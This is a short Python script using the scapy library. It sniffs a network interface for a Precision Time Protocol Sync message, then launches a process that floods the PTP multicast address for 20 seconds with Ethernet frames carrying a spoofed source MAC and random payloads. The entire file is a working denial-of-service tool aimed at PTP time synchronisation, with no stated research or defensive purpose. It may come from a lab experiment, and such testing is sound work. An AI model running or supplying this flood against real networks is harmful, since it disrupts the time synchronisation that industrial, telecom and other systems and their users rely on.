from scapy.all import Ether, Raw, sendp, sniff
import os
import multiprocessing
import time
# Define the function to execute
def send_flooding_ptp(ptp):
    # Send the Ethernet frame
    duration = 20
    start = time.time()
    while start+duration > time.time():
        sendp(ptp, iface='enp4s0')

def find_sync(packet):
    if Ether in packet:
        if packet[Ether].type == 35063:
            if packet.load[0] == 0:
                return True


master_sync = sniff(iface = "enp4s0", stop_filter = find_sync)[-1]

# Create an Ethernet frame with a custom payload
ethernet_frame = Ether(dst="01:1b:19:00:00:00", src="e8:eb:d3:b1:37:e7", type=35063)
raw = os.urandom(1024)
ptp = ethernet_frame/raw

processes = []
p = multiprocessing.Process(target=send_flooding_ptp, args=(ptp,))
processes.append(p)
p.start()


    



